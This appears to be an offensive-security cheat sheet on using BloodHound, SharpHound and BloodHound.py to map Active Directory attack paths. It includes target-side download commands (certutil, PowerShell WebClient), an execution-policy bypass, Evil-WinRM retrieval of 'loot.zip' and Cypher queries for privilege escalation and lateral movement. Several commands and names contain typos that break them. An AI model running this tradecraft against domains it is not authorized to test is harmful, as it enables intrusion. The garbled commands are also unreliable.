BloodHound is an Acitive Directory(AD) enumeration tool that leverages graph theory to discover and map AD relationships

* It provides a GUI interface for vizualizing AD objects (e.g. users, group, computers)
* It maps complex relationships to identify potential privilege escalation paths and misconfigurations
* Uses Neo4j as the backend database for storing and querying data
* Comes wih preferred queries for common enumeration and also supports custom Cypher queries for more specific use cases

[BloodHoundAD/BloodHound Github]()
[BloodHound docs]()
[SharpDound Docs]()
[Offensive Guide]()

---

### Installation & Setup on kali

```bash
apt install bloodhound
```

```bash
neo4j console
```

1. Access Neo4j Web interface
   * http://localhost:7474/ 
2. Default Credentials
    * ``neo4j:neo4j``
    * Change password to : ``neo4j:password123``
3. start BloodHound

```bash
bloodHound
```

---

### Installation on other linux

#### Install Neo4j Database

BloodHound requires Neo4j to store and query AD data

* Download and install Neo4j

1. Download the Neo4j Community edition

```bash
wget http://neo4j.com/artifact.php?name=neo4j-community-5.12.0-unix.tar.gz
```

2. Extract and install Neo4j

```bash
tar -xvzf neo4j-community-5.12.0-unix.tar.gz
```

```bash
cd nep4j-community-5.12.0-unix.tar.gz
```

3. Start Neo4j Service

```bash
./bin/neo4j console
```

4. Set the default credential in Neo4j

```bash
Username: neo4j
Password: neo4j
```

#### Install BloodHound

1. Clone BloodHound Repository

```bash
git clone http://github.com/BloodHoundAD/BloodHount.git
```

2. Install dependencies

```bash
cd BloodHound
```

```bash
npm install
```

```bash
npm run build
```

### SharpHound (Data Collector)

* BloodHound relies on **SharpHound** to collect AD data from the enviornment.
* SharpHound is written in C# and comes as an executable or powershell script

[BloodHound Collectors Github]()
[Sharphound Github]()
[SharpHound Releases]()

1. Download SharpHound from BloodHound Github Release

```bash
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/SharpHound.exe
```

2. Transfer ``SharpHound.exe`` to the target machine using SMB, HTTP, Evil-WinRM or other methods

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('<url>','SharpHound.exe')
```

```cmd
certutil.exe -urlcache -split -f "<url>" SharpHound.ps1
```

```cmd
certutil.exe -urlcache -split -f "<url>" SharpHound.exe
```


#### Run SharpHound for Data Collection

Sharphound can collect various types of data

* All Collection methods

```cmd
.\SharpHound.exe -c All -v
```

* Group membership collection

```cmd
.\SharpHound.exe -c Group -v
```

* Session collection

```cmd
.\SharpHound.exe -c Session -v
``` 

* ACL collection

```cmd
.\SharpHound.exe -c ACL -v
```

* Trust Collection

```cmd
.\SharpHound.exe Trust -v
```

* Output to ZIP

```cmd
.\SharpHound.exe -c All -v -o collection.zip
```

#### Using Powershell

* Bypass Execution Policy

```cmd
powershell.exe -nop -ep bypass
```

* Import SharpHound Module and start Collection

```powershell
Import-Module .\SharpHound.ps1
```

```Powershell
Import-BloodHound -CollectionMethd All -Domain infosecwarrior.local -ZipFileName loot.zip
```

* Use Invoke-BloodHound with different ``-CollectionMethod`` option to fine-tune your gathering
  * ``All`` -> Collect all available data (can be noisy)
  * ``Default`` -> Basic collection suitable for most situations
  * ``Group``, ``Session``, ``Trust`` -> Targeted collection for specific needs

* Alternate JSON output example

```powershell
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -JSONFolder "c:\data\bloodhound"
```

#### Downloading Results via Evil-WinRM

```powershell
*Evil-WinRM* PS C:\Users\DevNull> download BloodHound.zip
```

```powershell
*Evil-WinRM* PS C:\Users\DevNull> download loot.zip
```

#### Import Collected Data into BloodHound

1. Open BloodHound

```bash
./BloodHound
```

2. Log into Neo4j using the default credentials
3. Drag and drop the ``collection.zip`` file into the BloodHound Interface

---


### BloodHound.py

**BloodHound.py** is a python based ingestor for BloodHound used to collect Active Directory data from Linux or MacOS system (no need for Windows)

#### Installation

1. clone the repository

```bash
git clone https://github.com/dirkjanm/BloodHound/py
```

```bash
cd BloodHound.py
```

2. Install dependencies

```bash
pip install -r requirements.txt
```

#### Usage Example 

```bash
bloodhound-python --dns-tcp -u devnull -p password123 -ns 192.168.29.222 -d test.local -c All
```

**Command breakdown**

|Option|Description|
|------|----------|
|--dns-tcp| Use TCP for DNS resolution (can bypass certain firewall rules)|
|-u devnull| Username for the domain|
|-p Password123 | Password for the domain|
| -ns 192.168.29.222| specify the DNS Server(usually the domain controller)|
| -d test.local| Target Active Directory Domain|
|-c All| Collect all available data (can use Default, Group, Session, Trust, etc.)|

* Use -k for kerberos authentication (instead of password)
* For a stealthier approach, limit the scope of data collection with ``-c`` option
* The Collected data will be stored in a ``.json`` or ``.zip`` file - upload it to BloodHound for analysis

---

### Active Directory Enumeration

#### Basic Queries

BloodHound comes with builtin queries for quick analysis of AD relationship

* Find all domain admins

```bash
Find all Domain Admins
```

* Find Shortest path to domain admins

```bash
Shortest Path to Domain Admins
```

* Find Kerberoastable account

```bash
Find Kerberostable Accounts
```

* Find unconstrained delegation paths

```bash
Find Unconstrained Delegation Paths
```

* Find local admin rights

```bash
Find Local Admin Rights
```


#### User Enumeration

1. List all users

```bash
MATCH (u:User) Return u
```

2. Find users with kerberoastable SPNs

```bash
MATCH (u:User) WHERE u.hasspn = true RETURN u
```

3. Find users who can add members to specific groups

```bash
MATCH (u:User)-[:AddMember]->(g:Group) RETURN u.name, g.name
```

#### Group Enumeration

1. List all groups

```bash
MATCH (g:Group) RETURN g
```

2. Find groups with write permissions to other groups

```bash
MATCH (g:Group)-[:GenericWrite]->(t:Group) RETURN g,t
```

3. Find nested group membership

```bash
MATCH (g:Group)-[:MemberOf*1..]->(p:Group) RETURN g.name, p.name
```

#### Computer Enumeration

1. List all Computers

```bash
MATCH (c:Computer) RETURN c
```

2. Find computers with local admin privileges

```bash
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```

3. Find Computers with unconstrained delegation enabled

```bash
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c
```

#### ACL Enumeration

1. List all ACLs:

```bash
MATCH (n)-[r:HasControl|GenericAll|Owns]->(m) RETURN n.name, type(r), m.name
```

2. Find users with ``GenericAll`` on specific objects

```bash
MATCH (u:User)-[r:GenericAll]->(o) RETURN u.name, o.name
```

#### Trust Enumeration

1. List all domain trusts

```bash
MATCH (d:Domain)-[r:TrustedBy]->(n:Domain) RETURN d.name, r, n.name
```

2. Find Paths Between trusted domains

```bash
MATCH p=shortestPath((a:Domain)-[*]->(b:Domain)) RETURN p 
```

---

### Attack Techniques

#### Kerberoasting

```bash
MATCH (u:User) WHERE u.hasspn = true RETURN u
```

#### Privilege Escalation

```bash
MATCH p=shortestPath((u:User)-[*]->(g:Group {name: "Domain Admins"})) RETURN p
```

#### Lateral Movement


```bash
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```